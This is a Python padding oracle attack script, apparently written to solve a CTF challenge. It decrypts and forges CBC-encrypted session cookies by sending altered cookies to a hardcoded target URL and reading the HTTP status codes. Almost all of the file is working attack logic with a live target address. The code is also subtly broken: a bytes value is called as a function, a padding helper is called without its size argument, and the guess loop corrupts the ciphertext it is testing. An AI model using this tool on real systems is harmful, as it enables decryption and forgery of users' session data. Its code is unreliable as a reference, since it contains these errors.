#!/usr/bin/env python
from base64 import b64decode, b64encode
from binascii import hexlify, unhexlify
from urllib.parse import quote, unquote
import argparse
import requests
import pdb

def unpaddingPKCS7(bytestr):
    i = bytestr[-1]
    if bytes([i] * i) != bytestr[-i:]:
        raise ValueError('{} bad padding'.format(bytestr))
    return bytestr[:-i]

def paddingPKCS7(bytestr, size):
    i = size - (len(bytestr) % size)
    return bytestr + bytes([i] * i)

def decode_encrypted_sample(encrypted_sample, encoding):
    '''
    encoding:
        0 - base64
        1 - url token + base64
        2 - hex
    '''
    if encoding == 0:
        return b64decode(encrypted_sample)
    elif encoding == 1:
        return b64decode(unquote(encrypted_sample))
    elif encoding == 2:
        return unhexlify(encrypted_sample)

def encode_encrypted_plaintext(encrypted_plaintext, encoding):
    if encoding == 0 or encoding == 1:
        return quote(b64encode(encrypted_plaintext).decode())
    elif encoding == 2:
        return hexlify(encrypted_plaintext).decode()

def padding_attack(ciphertext, block_size, known_bytes, guess_byte):
    b1 = bytes([0] * (block_size - 1 - len(known_bytes)) + [guess_byte]) + known_bytes
    b2 = bytes([0] * (block_size - 1 - len(known_bytes)) + [len(known_bytes) + 1] * (len(known_bytes) + 1)) # new padding
    
    return ciphertext[:-block_size * 2] + \
           bytes([ciphertext[-block_size * 2 + i] ^ b1[i] ^ b2[i] for i in range(block_size)]) + \
           ciphertext[-block_size:]

def padding_encrypted_sample(encrypted_sample, plaintext_length, block_size):
    if len(encrypted_sample) >= plaintext_length + block_size:
        return encrypted_sample[:plaintext_length + block_size]
    else:
        return encrypted_sample + bytes([0] * (plaintext_length + block_size - len(encrypted_sample)))

def decrypted_block_results(block_number, cipher_text, intermediate_bytes, plain_text):
    print("\nBlock {} Results:".format(block_number))
    print("[+] Cipher Text (HEX): {}".format(hexlify(cipher_text).decode()))
    print("[+] Intermediate Bytes (HEX): {}".format(hexlify(intermediate_bytes).decode()))
    print("[+] Plain Text: {}".format(plain_text.decode()))

def decrypted_output(decrypted):
    print("-------------------------------------------------------")
    print("** Finished ***\n")
    print("[+] Decrypted value (ASCII): {}\n".format(decrypted.decode()))
    print("[+] Decrypted value (HEX): {}\n".format(hexlify(decrypted).decode()))
    print("[+] Decrypted value (Base64): {}\n".format(b64encode(decrypted).decode()))
    print("-------------------------------------------------------\n")

def encrypted_block_results(block_number, cipher_text, intermediate_bytes):
    print("\nBlock {} Results:".format(block_number))
    print("[+] New Cipher Text (HEX): {}".format(hexlify(cipher_text).decode()))
    print("[+] Intermediate Bytes (HEX): {}\n".format(hexlify(intermediate_bytes).decode()))

def encrypted_output(encrypted):
    print("-------------------------------------------------------")
    print("** Finished ***\n")
    print("[+] Encrypted value is: {}".format(encrypted))
    print("-------------------------------------------------------")

def decrypt_last_block(url, ciphertext, block_size, print_result = True): 
    
    known_bytes = b''
    while len(known_bytes) < block_size:
        for i in range(256):
            if i != len(known_bytes) + 1:
                ciphertext = padding_attack(ciphertext, block_size, known_bytes, i)
                if exam_ciphertext(url, quote(b64encode(ciphertext).decode())):
                    if print_result:
                        print("[+] Success: ({}/256) [Byte {}]".format(i + 1, block_size - len(known_bytes)))
                    known_bytes = bytes([i]) + known_bytes
                    break
        else:
            if print_result:
                print("[+] Success: ({}/256) [Byte {}]".format(len(known_bytes) + 1, block_size - len(known_bytes)))
            known_bytes = bytes([len(known_bytes)]) + known_bytes 
    return known_bytes

def decrypt_attack(url, encrypted_sample, block_size, encoding = 0, print_result = False):
    encrypted_sample = decode_encrypted_sample(encrypted_sample, encoding)
    decrypted_sample = b""
    for i in range(1, (len(encrypted_sample) // block_size)):
        if print_result:
            print("\n*** Starting Block {} of {} ***\n".format(i, (len(encrypted_sample) // block_size)))
        
        cipher_text = encrypted_sample[:(i + 1) * block_size]
        plain_text = decrypt_last_block(url, cipher_text, block_size, print_result)
        print(cipher_text[-block_size:])
        print(plain_text)
        intermediate_bytes = bytes([cipher_text[-block_size + j] ^ plain_text[j] for j in range(block_size)])

        if i == (len(encrypted_sample) // block_size) - 1:
            plain_text = unpaddingPKCS7(plain_text)

        if print_result:
            decrypted_block_results(i, cipher_text[-block_size:], \
                                    intermediate_bytes(cipher_text[-block_size:], plain_text, block_size), \
                                    plain_text)

        decrypted_sample += plain_text

    if print_result:
        decrypted_output(decrypted_sample)
    
    return decrypted_sample

def encrypt_attact(url, encrypted_sample, block_size, plaintext, encoding = 0, print_result = False):
    encrypted_sample = decode_encrypted_sample(encrypted_sample, encoding)
    plaintext = paddingPKCS7(plaintext.encode())
    encrypted_sample = padding_encrypted_sample(encrypted_sample, len(plaintext), block_size)
    
    encrypted_plaintext = encrypted_sample[-block_size:]

    for i in range((len(plaintext) // block_size) - 1, -1, -1):
        decrypted_sample_last_block = decrypt_last_block(url, encrypted_sample, block_size)

        intermediate_bytes = bytes([encrypted_sample[-block_size * 2 + j] ^ decrypted_sample_last_block[j] for j in range(block_size)])
        cipher_text = bytes([intermediate_bytes[j] ^ plaintext[i * block_size + j] for j in range(block_size)])  
        encrypted_plaintext = cipher_text + encrypted_plaintext

        if print_result:
            encrypted_block_results(i + 1, cipher_text, intermediate_bytes)
            
        encrypted_sample = encrypted_sample[:-block_size * 2] + cipher_text

    encrypted_plaintext = encode_encrypted_plaintext(encrypted_plaintext, encoding)
    if print_result:
        encrypted_output(encrypted_plaintext)

    return encrypted_plaintext

def parse_options():
    parser = argparse.ArgumentParser(usage='%(prog)s <URL> <EncryptedSample> <BlockSize> [options]',
                                     description='Padding oracle attack-Tool @Qin',
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('URL', type=str, help='The target URL')
    parser.add_argument('EncryptedSample', type=str, help='The encrypted value you want to test. Must also be present in the URL, PostData or a Cookie')
    parser.add_argument('BlockSize', type=int, help='The block size being used by the algorithm')


    parser.add_argument('--cookies', type=str, help='Cookies (name1=value1; name2=value2)')
    parser.add_argument('--encoding', type=int, help='Encoding Format of Sample (Default 0)[0-2]: 0=Base64, 1=Base64+UrlToken, 2=Hex')
    parser.add_argument('--headers', type=str, help='Custom Headers (name1::value1;name2::value2)')
    parser.add_argument('--plaintext', type=str, help='Plain-Text to Encrypt')
    
    args = parser.parse_args()

    return args


def exam_ciphertext(url, encrypted):
    
    cookie = {"iknowmag1k" : encrypted}
    print(cookie)
    response = requests.post(url, cookies=cookie)
    print(response)
    if response.status_code == 200:
        return True
    return False

if __name__ == "__main__":
    # args = parse_options()

    # #http://88.198.233.174:40068/profile.php
    # url = args.URL
    # encrypted_sample = args.EncryptedSample
    # block_size = args.BlockSize
    # if args.encoding:
    #     encoding = args.encoding
    # else:
    #     encoding = 0

    # if args.plaintext:
    #     plaintext = args.plaintext
    #     #encrypt_attact(url, encrypted_sample, block_size, plaintext, encoding, True)
    # else:
    #     pass
        #decrypt_attack(url, encrypted_sample, block_size, encoding, True)

    url = "http://88.198.233.174:40097/profile.php"
    encrypted_sample = "GoDDEca7EaZmD9eVr0rBeC8we2jtRbamZ2W%2B%2BUJyL130mqn%2F71QdRQ%3D%3D"
    block_size = 8
    encoding = 1
    #decrypt_attack(url, encrypted_sample, block_size, encoding, True)
    cookie = {"iknowmag1k":"GoDDEca7EaZmD9eVr0rIeA%3D%3D"}
    response = requests.post(url, cookies=cookie)
    print(response.status_code)




    



    